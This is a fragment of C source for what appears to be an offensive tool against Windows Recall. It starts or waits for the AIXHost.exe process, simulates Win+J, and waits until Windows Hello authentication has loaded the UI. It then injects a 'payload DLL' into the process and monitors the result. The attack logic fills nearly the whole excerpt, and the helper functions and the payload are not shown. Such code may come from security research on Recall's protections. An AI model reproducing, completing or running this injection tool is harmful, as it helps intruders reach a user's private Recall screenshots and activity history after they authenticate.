        Info("Launching Recall via Win+J...\n"); SimulateWinJ();
        Info("Waiting for AIXHost.exe");
        for (int i = 0; i < 60 && !pid; i++) { Sleep(500); pid = FindProc(TARGET); printf("."); }
        printf("\n");
    } else if (!pid && mode == WAIT) {
        Banner(); Separator(); printf("\n");
        Info("Waiting for user to open Recall (Win+J or taskbar)...\n");
        for (int i = 0; i < 600 && !pid; i++) { Sleep(500); pid = FindProc(TARGET); if (i%10==0) printf("."); }
        printf("\n");
    }
    if (!pid) { Fail("Recall did not start\n"); return 1; }

    if (!g_osBuild[0]) DetectOS();
    GetAIXVersion(pid); Banner(); Separator(); printf("\n");

    SIZE_T ws = GetWS(pid);
    char msg[128]; sprintf_s(msg, "Target: AIXHost.exe  PID %lu  Memory %zu MB\n", pid, ws/1024/1024); OK(msg);

    if (mode == LAUNCH) { Info("Triggering Recall via Win+J...\n"); SimulateWinJ(); }

    // Wait for Hello auth (working set > threshold = UI loaded)
    {
        if (mode == WAIT) Info("Waiting for user to open Recall and authenticate");
        else              Info("Waiting for Hello authentication");
        bool loaded = false;
        for (int i = 0; i < 240; i++) {
            Sleep(500);
            DWORD fresh = FindProc(TARGET);
            if (fresh && fresh != pid) pid = fresh;
            ws = GetWS(pid);
            if (ws >= WS_READY && !loaded) {
                loaded = true;
                printf(" authenticating");
                Sleep(3000);
            }
            if (loaded) break;
            if (i % 10 == 0) printf(".");
        }
        printf("\n");
        if (!loaded) { Fail("Recall was not loaded within timeout\n"); return 1; }
        DWORD fresh = FindProc(TARGET);
        if (fresh) pid = fresh;
        ws = GetWS(pid);
        char m2[128]; sprintf_s(m2, "Recall ready  PID %lu  Memory %zu MB\n", pid, ws/1024/1024); OK(m2);
    }

    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        Fail("Payload DLL not found\n");
        C(GRAY); printf("  Expected: "); wprintf(L"%s\n", dllPath); C(RESET);
        return 1;
    }

    DWORD t0 = GetTickCount(); GetSystemTimeAsFileTime(&g_injectTime);
    Unload(pid);
    Info("Injecting payload...\n");
    if (!Inject(pid, dllPath)) { Fail("Injection failed\n"); return 1; }
    OK("Payload active\n");
    MonitorAndReport(baseDir, t0, false);
    return 0;
}
